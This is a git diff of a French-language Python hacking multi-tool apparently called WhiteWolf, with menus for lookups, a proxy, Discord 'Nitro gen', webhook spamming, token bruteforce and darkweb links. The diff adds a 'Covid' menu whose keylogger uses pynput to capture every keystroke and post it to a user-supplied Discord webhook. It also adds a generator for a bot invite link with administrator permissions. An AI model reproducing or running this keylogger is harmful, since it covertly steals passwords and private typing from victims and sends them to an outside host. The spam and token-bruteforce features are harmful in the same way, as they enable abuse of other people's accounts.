@@ -12,42 +12,60 @@ import base64
 from api import api_ip, api_number, api_dns
 from sites import sites
 from darkweb import links
+from pynput import keyboard
 
 # FIXME - Add Gestions Error i d'ont have time sry ;p
+
+red = "\033[31m"
+green = "\033[32m"
+yellow = "\033[33m"
+blue = "\033[34m"
+white = "\033[37m"
+reset = "\033[0m"
+
+
+def show_informations():
+    os.system("cls")
+    print(f"""{red} Informations {red}
+            Telegram - https://t.me/whitewolf_tools
+            Gunslol - https://guns.lol/xqldev
+        """)
+    time.sleep(5)
 
 
 while True:
     os.system("cls")
-    choix = input(f"""
+    choix = input(f""" {white}
             ██╗    ██╗██╗  ██╗██╗████████╗███████╗██╗    ██╗ ██████╗ ██╗     ███████╗
             ██║    ██║██║  ██║██║╚══██╔══╝██╔════╝██║    ██║██╔═══██╗██║     ██╔════╝
             ██║ █╗ ██║███████║██║   ██║   █████╗  ██║ █╗ ██║██║   ██║██║     █████╗  
             ██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██║███╗██║██║   ██║██║     ██╔══╝  
             ╚███╔███╔╝██║  ██║██║   ██║   ███████╗╚███╔███╔╝╚██████╔╝███████╗██║     
             ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝     
+        [I]. Informations                                      
 
-            1. [Lookup]    4. [Quit]
-            2. [Sécurity]
+            1. [Lookup]    4. [Covid]
+            2. [Sécurity]  5. [Quit]
             3. [Discord]
-
-            Fais ton choix : """)
+                {white}
+            Fais ton choix : """).lower()
         
     if  choix == "1":
         os.system("cls")
-        choix2 = input(f"""
+        choix2 = input(f""" {white}
                             ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗ 
                             ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗
                             ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝
                             ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝ 
                             ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║     
                             ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     
-                                                        
+                    [I]. Informations                                      
 
                             1. [IP]          4. [Google]      7. [Github]
                             2. [Number]      5. [Dns]         8. [Leak Mail]
                             3. [Username]    6. [DISCORD]     9. [Quit]
-                            
-                            Fais ton choix : """)
+                                {white}
+                            Fais ton choix : """).lower()
         if choix2 == "1":
             os.system("cls")
             choixip = input("""
@@ -267,6 +285,9 @@ while True:
                 print("Aucun Resultas ou bug", response.status_codes)
                 time.sleep(5)
 
+        elif choix2 == "i":
+            show_informations()
+
         elif choix2 == "9":
             print("Tu va quitté le tools")
             time.sleep(2)
@@ -277,19 +298,19 @@ while True:
     # Menu sécurity
     elif choix == "2":
         os.system("cls")
-        choix3 = input(f"""
+        choix3 = input(f""" {white}
         ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
         ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
         ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
         ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
         ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
         ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
-        
+    [I]. Informations    
         1. [PROXY(VPN)]     4. [Scraper]
         2. [Gen Password]   5. [Quit]
         3. [Status Website]   
-        
-        Fais ton choix : """)
+            {white}
+        Fais ton choix : """).lower()
 
         if choix3 == "1":
             os.system("cls")
@@ -307,7 +328,7 @@ while True:
             try:
                 vpn = int(vpn)
 
-                proxy = "170.106.136.181:31002"
+                proxy = "80.92.227.185:5678"
 
                 proxies = {
                     "http": f"http://{proxy}",
@@ -441,6 +462,9 @@ while True:
             except ValueError:
                 print("Error input")
 
+        elif choix3 == "i":
+            show_informations()
+
         elif choix3 == "5":
             print("Au-Revoir a bientot l'amis")
             time.sleep(2)
@@ -448,19 +472,20 @@ while True:
     # catgegories
     elif choix == "3":
         os.system("cls")
-        discord = input(f"""
+        discord = input(f""" {white}
             ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
             ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
             ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
             ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
             ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
             ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
-            
-            1. [Nitro Gen]       4. [Token BruteForce]
-            2. [Spaming Webhook] 5. [Quit]
-            3. [Darkweb]
+        [I]. Informations               
 
-            Choisis : """)
+            1. [Nitro Gen]       4. [Token BruteForce]
+            2. [Spaming Webhook] 5. [Bot to id]
+            3. [Darkweb]         6. [Quit]
+                {white}
+            Choisis : """).lower()
 
         # Nitro gen
         if discord == "1":
@@ -568,14 +593,97 @@ while True:
             except:
                 print("Ca na pas marché")
                 time.sleep(2)
-        
         elif discord == "5":
+            os.system("cls")
+            id_bot = int(input("""
+                ██╗███╗   ██╗██╗   ██╗██╗████████╗
+                ██║████╗  ██║██║   ██║██║╚══██╔══╝
+                ██║██╔██╗ ██║██║   ██║██║   ██║   
+                ██║██║╚██╗██║╚██╗ ██╔╝██║   ██║   
+                ██║██║ ╚████║ ╚████╔╝ ██║   ██║   
+                ╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝   ╚═╝
+
+                Met L'id de ton bot : """))
+
+            try:
+                id = id_bot
+                print(f"https://discord.com/oauth2/authorize?client_id={id}&permissions=8&integration_type=0&scope=bot")
+                time.sleep(5)
+           
+            except ValueError:
+                print("Problème...")
+                time.sleep(5)
+        
+        elif discord == "i":
+            show_informations()
+
+        elif discord == "6":
             print("Aurevoir l'amis")
             time.sleep(2)
             break
             
-    # Ici on a mis le quit si la personne a lancé sans fair expres
     elif choix == "4":
+        os.system("cls")
+        covid = input(f""" {white}
+             ██████╗ ██████╗ ██╗   ██╗██╗██████╗      ██╗ █████╗ 
+            ██╔════╝██╔═══██╗██║   ██║██║██╔══██╗    ███║██╔══██╗
+            ██║     ██║   ██║██║   ██║██║██║  ██║    ╚██║╚██████║
+            ██║     ██║   ██║╚██╗ ██╔╝██║██║  ██║     ██║ ╚═══██║
+            ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝     ██║ █████╔╝
+            ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝      ╚═╝ ╚════╝ 
+            
+            1. [KeyLogger]
+            
+                {white}
+            Fais ton choix : """)
+        
+        if covid == "1":
+            os.system("cls")
+            webhook_choice = input(f"""{blue}
+
+            ▄████▄   ▒█████   ██▒   █▓ ██▓▓█████▄     ██▓     ▒█████    ▄████ ▓█████  ██▀███  
+            ▒██▀ ▀█  ▒██▒  ██▒▓██░   █▒▓██▒▒██▀ ██▌   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
+            ▒▓█    ▄ ▒██░  ██▒ ▓██  █▒░▒██▒░██   █▌   ▒██░    ▒██░  ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
+            ▒▓▓▄ ▄██▒▒██   ██░  ▒██ █░░░██░░▓█▄   ▌   ▒██░    ▒██   ██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
+            ▒ ▓███▀ ░░ ████▓▒░   ▒▀█░  ░██░░▒████▓    ░██████▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒
+            ░ ░▒ ▒  ░░ ▒░▒░▒░    ░ ▐░  ░▓   ▒▒▓  ▒    ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
+            ░  ▒     ░ ▒ ▒░    ░ ░░   ▒ ░ ░ ▒  ▒    ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
+            ░        ░ ░ ░ ▒       ░░   ▒ ░ ░ ░  ░      ░ ░   ░ ░ ░ ▒  ░ ░   ░    ░     ░░   ░ 
+            ░ ░          ░ ░        ░   ░     ░           ░  ░    ░ ░        ░    ░  ░   ░     
+            ░                      ░        ░                                                  
+                        {blue}
+            Met ton webhook : """)
+
+            webhook = webhook_choice
+
+            def on_press(key):
+                try:
+                    char = key.char
+                    print(char)
+                    data = {
+                        "content": char
+                    }
+                    
+                    requests.post(webhook, json=data)
+                except:
+                    char = str(key)
+                    print(char)
+                    
+                    data = {
+                        "content": char
+                    }
+                    
+                    requests.post(webhook, json=data)
+
+            listener = keyboard.Listener(on_press=on_press)
+            listener.start()
+            listener.join()
+
+
+    # Ici on a mis le quit si la personne a lancé sans fair expres
+    elif choix == "":
         print("Au-Revoir a bientot l'amis")
         time.sleep(2)
         break
+    elif choix == "i":
+        show_informations()
